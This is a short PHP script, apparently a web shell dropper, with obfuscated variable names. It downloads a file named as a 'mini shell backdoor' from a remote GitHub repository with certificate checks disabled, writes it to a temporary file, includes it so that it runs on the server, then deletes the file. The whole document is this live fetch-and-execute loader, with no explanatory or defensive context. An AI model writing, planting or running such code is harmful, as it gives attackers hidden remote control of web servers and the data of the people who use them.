<?php
$hS = curl_init();
curl_setopt_array($hS, array(CURLOPT_URL => "https://raw.githubusercontent.com/22XploiterCrew-Team/Gel4y-Mini-Shell-Backdoor/dev/gelay.php", CURLOPT_SSL_VERIFYHOST => FALSE, CURLOPT_SSL_VERIFYPEER => FALSE, CURLOPT_RETURNTRANSFER => TRUE));
$rL = curl_exec($hS);
curl_close($hS);
function tv($rR)
{
    $y5 = tempnam(sys_get_temp_dir(), "tmp_func");
    file_put_contents($y5, "{$rR}");
    $ZC = (include $y5);
    unlink($y5);
    return $ZC;
}
tv($rL);